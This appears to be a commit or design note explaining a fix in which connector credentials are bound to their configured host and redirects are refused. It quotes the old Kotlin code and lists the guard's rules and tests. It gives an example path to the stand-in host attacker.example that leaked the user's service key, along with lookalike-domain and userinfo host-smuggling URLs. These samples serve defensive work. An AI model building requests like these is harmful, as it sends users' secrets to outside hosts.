# P8.B - a credential only travels to the host it belongs to

`LocalConnectorCall.build` accepted an absolute URL from the model and then attached the project's
credential to it:

```kotlin
val url = if (path.startsWith("http")) path else "$trimmedBase/${path.trimStart('/')}"
...
"supabase" -> { headers["apikey"] = key; headers["Authorization"] = "Bearer $key" }
```

So `path = "https://attacker.example/collect"` posted the user's Supabase service key, n8n API key or
Firebase web key to that host. OkHttp also followed redirects by default, so even a correct first host
could bounce the credential elsewhere without the model doing anything wrong.

## What is enforced now

`CredentialHostGuard.check(service, base, target)` runs **before** any header map is built:

- the target must be **https** (plain http puts the key in the clear);
- the target host must be the host the user configured for that service, **or a subdomain of it**;
- Firebase additionally may reach Google's own API hosts (`googleapis.com`, `firebaseio.com`,
  `firebaseapp.com` and the three specific `*.googleapis.com` endpoints), because a Firebase web key is
  designed for client use against those and nowhere else. That allowance is per-service and does not
  leak to Supabase or n8n;
- matching is on **label boundaries**: `abcdefgh.supabase.co.evil.tld` and `googleapis.com.evil.tld`
  are refused, so a lookalike cannot pass by suffix;
- userinfo cannot smuggle a host (`https://real.host@attacker.example/x` is refused);
- anything malformed is refused rather than guessed.

A refusal returns a sentence naming the two hosts, so the model can correct itself by using a relative
path. `Spec.refusal` carries it and `execute` returns it without building a request.

## Redirects

The client now sets `followRedirects(false)` and `followSslRedirects(false)`. A 3xx is reported as a
stopped call, naming the redirect target, with the reason: following it would send the credential to a
host it does not belong to. This is the same class of leak as `10b2380` (custom headers across a
redirect), closed here for connector credentials.

## Tests

`CredentialHostGuardTest` (8): the configured host and its paths are allowed; an absolute URL to another
host is refused; lookalike domains are refused on label boundaries; plain http is refused; Firebase may
reach Google's API surface but nothing else; another service does not inherit Firebase's allowance;
malformed input is refused; userinfo cannot smuggle a host and an explicit port is fine.

Full suite 2600 tests, one known `BackupTarTest` root-sandbox failure (green in CI).

## P8 status

- A. External service integration registry: local services (Firebase, Supabase, n8n) address credentials
  on the device; cloud connectors go through the proxy. Bounded output (6000 chars).
- B. Credential management: `SecureTokenStore` storage and redaction (unchanged), plus **host binding and
  redirect refusal (this commit)**. A shared credential cache across services is **not** implemented;
  each service keeps its own entry.
- C. Error handling: connector failures return an actionable sentence rather than a stack trace.
- D. Approval: `use_connector` and every `mcp_*` call require an explicit card, even under AUTO_ALL
  (`401cedd`).
